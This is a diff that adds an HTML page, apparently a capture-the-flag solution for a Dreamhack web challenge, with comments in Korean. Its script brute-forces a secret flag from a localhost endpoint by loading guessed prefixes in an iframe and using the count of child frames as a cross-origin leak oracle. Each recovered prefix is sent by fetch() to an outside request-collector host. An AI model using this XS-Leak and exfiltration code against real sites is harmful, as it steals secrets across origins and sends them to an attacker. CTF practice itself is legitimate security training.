@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Iframe</title>
+</head>
+<body>
+    <h1>Open Iframe</h1>
+    <iframe id="mainframe" width="600" height="400"></iframe>
+
+    <script>
+        const baseUrl = "http://localhost:80/flag?flag=";
+        const asciiCodes = Array.from({ length: 95 }, (_, i) => String.fromCharCode(i + 33)); // ASCII 32 to 127
+        let currentFlag = "";
+
+        const checkChildCount = async (flag) => {
+            const frame = document.getElementById("mainframe");
+            frame.src = baseUrl + encodeURIComponent(flag); // URL에 현재 flag 추가
+            await new Promise(resolve => frame.onload = resolve); // iframe 로드 대기
+
+            return frame.contentWindow.frames.length; // 자식 iframe 개수 반환
+        };
+
+        const findFlag = async () => {
+            let found = true;
+
+            while (found) {
+                found = false;
+
+                for (const char of asciiCodes) {
+                    const newFlag = currentFlag + char;
+                    const childCount = await checkChildCount(newFlag);
+
+                    if (childCount === 0) {
+                        currentFlag = newFlag; // flag 업데이트
+                        fetch(`https://iukfhro.request.dreamhack.games?flag=${encodeURIComponent(currentFlag)}`); // 현재 flag 전송
+                        found = true; // 새로운 문자를 찾았으므로 루프 계속
+                        break; // 다음 문자로 넘어감
+                    }
+                }
+            }
+
+            console.log("No more valid characters found. Final flag:", currentFlag);
+        };
+
+        findFlag();
+    </script>
+</body>
+</html>
